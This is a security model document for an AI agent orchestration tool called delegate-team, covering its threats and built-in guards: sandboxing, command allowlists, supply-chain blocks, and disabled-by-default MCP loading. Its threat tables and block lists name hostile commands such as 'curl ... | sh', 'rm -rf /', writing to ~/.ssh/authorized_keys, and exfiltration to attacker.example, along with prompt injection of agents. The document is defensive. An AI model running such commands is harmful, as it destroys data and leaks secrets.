# Security Model

> **TL;DR**: delegate-team runs AI agents on your local machine. It has built-in
> guards for the common risks (workspace escape, command injection, supply
> chain, prompt injection, MCP auto-load) and exposes opt-in switches for the
> rest. Read this doc before running on a shared machine or in CI.

For installation-level safety (dry-run, no-network, trust modes), see
[INSTALLATION.md](./INSTALLATION.md#safety-notes) and the installer flags.

---

## Threat model

`delegate-team` is an AI agent orchestration tool. It executes code and
terminal commands on the local machine under your user account. The threats we
care about include:

| Risk | Example |
|---|---|
| Prompt injection via skills | A malicious `SKILL.md` injecting instructions |
| Secrets management | API keys leaked in logs or stderr |
| Supply chain | `npm install <untrusted>` or `curl ... | sh` |
| Insecure plugin design | MCP server with arbitrary code execution |
| Excessive agency | Agent `rm -rf /` because the prompt asked for cleanup |

Plus operational risks specific to multi-agent and orchestrator systems:

| Risk | Example |
|---|---|
| Subprocess runaway | MMAS spawning too many agents and exhausting the host |
| Filesystem escape | Agent writing to `~/.ssh/authorized_keys` |
| Network exfiltration | Agent `curl https://attacker.example` after a prompt |
| Lifecycle leak | Watchdog or child subprocesses left running after stop |
| Release drift | npm package published with missing runtime files or stale manifests |

---

## Built-in guards

### 1. Workspace sandboxing

The `vertex-coder` agent tools (`read_file`, `write_file`, `list_dir`,
`grep_search`, `line_replace`) are bound to `DT_WORKSPACE_ROOT` or the current
working directory. Access to sensitive paths such as `.env`, `~/.ssh`, and
`~/.config` is blocked unless explicitly overridden.

Override (dangerous): `DT_WORKSPACE_ESCAPE=1`.

### 2. Command allowlist

The `run_command` tool enforces a strict allowlist of safe commands. Destructive
operations require:

```bash
export DT_ALLOW_UNSAFE_COMMANDS=true
```

The model cannot set this itself. A human must export it.

### 3. Supply chain guard

The `add_dependency` tool blocks:

- Direct tarball / zip URLs.
- Local path references (`../pkg`).
- Editable installs.
- `npm install` without `--ignore-scripts`.

Installing any package requires:

```bash
export DT_ALLOW_DEP_INSTALL=true
```

### 4. Untrusted skills

Global skills (`SKILL.md`) loaded from external directories are treated as
untrusted. They cannot inject system instructions or appear in the agent's
context without one of:

- An entry in the explicit allowlist.
- The `DT_APPROVE_UNTRUSTED=true` environment variable.

### 5. Proxy hardening

The local LLM gateway (`dt serve`):

- Binds to `127.0.0.1` only.
- Requires a proxy token.
- Uses constant-time comparison for equal-length proxy tokens.
- Strict CORS allowing only explicit localhost UI ports.
- 2 MB request body size limit by default, configurable via `DT_PROXY_MAX_BODY`.
- Automatic log redaction for API keys and Bearer tokens.

### 6. MCP process security

By default, `dt` does **not** auto-load MCP servers from `mcp_config.json`.
This blocks a malicious config file from triggering arbitrary remote code
execution via `subprocess.Popen`.

To opt in:

```bash
export DT_ENABLE_MCP=true
```

### 7. Dynamic authentication

`dt` avoids hardcoded keys in committed files. It uses dynamic CLI auth and
caches local config at `~/.config/dt/config.json` with `0600` permissions.
MetaGPT adapter config is written to `~/.metagpt/config2.yaml` with `0600`.
Containing directories are set to `0700`.

---

## Installer-level safety

The bootstrap script (`install.sh`) supports safety modes:

| Flag | What it does |
|---|---|
| `--dry-run` | Prints every write + network call without making it |
| `--no-network` | Skips `npx skills add`, `git clone`, and any `npm install -g` |
| `--trust-mode strict` | Disables MCP auto-load, blocks external downloads, prints every sensitive op |
| `--trust-mode normal` | Current safe default |
| `--trust-mode dev` | Allows local development shortcuts; prints warnings |
| `--yes` | Non-interactive approval for CI |

See [INSTALLATION.md](./INSTALLATION.md#lane-3--full-local-agent-os) for usage.

### What the installer touches

On a Lane 3 install (`./install.sh --all`), the installer may:

- Write to `~/.apeiron/skills/`, `~/.apeiron/agents/`, `~/.apeiron/bin/`
- Symlink to `~/.claude/commands/`, `~/.claude/skills/`, `~/.claude/hooks/`
- Symlink to `~/.local/bin/` and `~/bin/`
- Create `~/.agent-kernel/` (kernel-managed)
- Run `npx skills add <third-party>` for companion frameworks
- Run `npm install -g` for unslop-preflight

`--no-network` blocks the last two. `--dry-run` shows all of them without doing
them.

---

## npm publish safety

npm publishing is performed directly from a trusted maintainer workstation. GitHub Actions has no npm publish or GitHub Release authority.

Before publishing, the maintainer runs:

```bash
npm whoami
npm ci
npm run release:verify
npm run release:publish
```

The local verification includes version synchronization, type checking, linting, build, full tests, production dependency audit, packed-artifact inventory and clean-install smoke testing, and npm publish dry run.

Security rules:

- Never print or copy the npm access token into logs, prompts, or documentation.
- Never use `sudo npm publish`.
- Confirm the target version does not already exist.
- Publish only from a clean, reviewed working tree on the intended commit.
- Keep GitHub package-integrity workflows read-only.
- Remove or rebuild obsolete release automation rather than bypassing failing checks blindly.

---

## MMAS-level safety

The multi-agent runtime adds subprocess-spawning risk. See [MMAS.md](./MMAS.md)
for full details. Highlights:

| Guard | Default | Override |
|---|---|---|
| Max agents | 4 | `--max-agents <N>` (hard cap 8) |
| Per-agent timeout | 900 s | `--timeout <seconds>` |
| Write mode | `workspace` | `--no-write`, `--write-mode none`, `--write-mode logs-only` |
| Watchdog interval | 30 s | `--interval <seconds>` |
| Kill grace | 5 s | `--kill-grace <seconds>` (hard cap 30) |
| Kill switch | manual | `spawn-team.py stop <task_id>` |

Agents and watchdogs are started with `start_new_session=True`, which creates a
detached process group. The stop command now terminates process groups with
`SIGTERM`, waits for the configured grace period, then sends `SIGKILL` if the
original PID is still alive. This is designed to clean up child processes, not
only parent PIDs.

Atlas mode also cleans up the Atlas process group if `team_plan.json` is not
written before `--atlas-timeout`.

---

## agent-kernel-level safety

The kernel adds a deterministic policy guard. It runs as a `pre-commit` hook and
as a Claude `PreToolUse` hook. It blocks:

- `rm -rf` outside the workspace.
- `curl ... | sh`.
- Force-push to `main` / `master`.
- Any file containing what looks like a leaked secret (heuristic).

You can add your own rules in `~/.agent-kernel/source/memories/`; see
[AGENT-KERNEL-INTEGRATION.md](./AGENT-KERNEL-INTEGRATION.md).

---

## Reporting a vulnerability

Email `maintainers@delegate-team.dev` or open a private security advisory on
GitHub. Do **not** open a public issue for suspected vulnerabilities.

---

## What we do NOT do

- We do not run delegate-team as a network service by default.
- We do not auto-load untrusted skills.
- We do not auto-load MCP servers.
- We do not auto-install companion frameworks without `--all`.
- We do not write to `~/.ssh/`, `~/.aws/`, or `~/.config/` unless you explicitly
  enable workspace escape.
- We do not publish to npm merely because a commit landed. The workflow checks
  whether the version is new first.

If any of those defaults changes, it will be a major version bump.

---

## Quick reference

```bash
# Maximum safety (offline, dry-run)
./install.sh --all --dry-run --no-network --trust-mode strict

# Recommended for shared machines
./install.sh --all --trust-mode strict --yes

# CI / scripted
./install.sh --all --trust-mode normal --yes --no-network

# Local development
./install.sh --all --trust-mode dev --yes

# Inspect what the orchestrator would do
apeiron "<task>"
dt route --explain "<task>"
dt run "<task>" --dry-run

# Kill a runaway MMAS run
dt mmas stop <task_id>

# Release guard
npm run version:check
npm install --package-lock-only
```

## ChatGPT Remote Agent boundary

`dt remote` treats Remote Desktop Commander as the transport and ChatGPT as the acting agent. It does not install, register, or trust the MCP/app connection automatically. The user establishes that connection and approves its permissions first.

`dt remote init` creates a canonical workspace boundary and a deny-by-default policy. The following capabilities are disabled unless explicitly enabled:

- Dependency installation
- File deletion
- Git commits, push, and merge
- Package publishing
- Persistent system changes
- Secret or credential-file access

The generated `CHATGPT_REMOTE_AGENT.md` instructs ChatGPT to remain inside the approved root, read repository rules, run baseline and final tests, review diffs, and verify delegated work independently.

Local session state and logs are ignored by the nested `.delegate-team/.gitignore`. Metadata and policy files are written atomically with private file permissions. Existing policy is preserved unless the user invokes initialization with `--force`.

Agent discovery reads executable paths and bounded `--version` output only. It does not read auth files, environment-variable values, browser sessions, keychains, tokens, or API keys.

The bootstrap prompt discloses the global `delegate-team` installation before running it. It does not use elevated privileges automatically and does not install additional coding-agent CLIs until the user selects them.
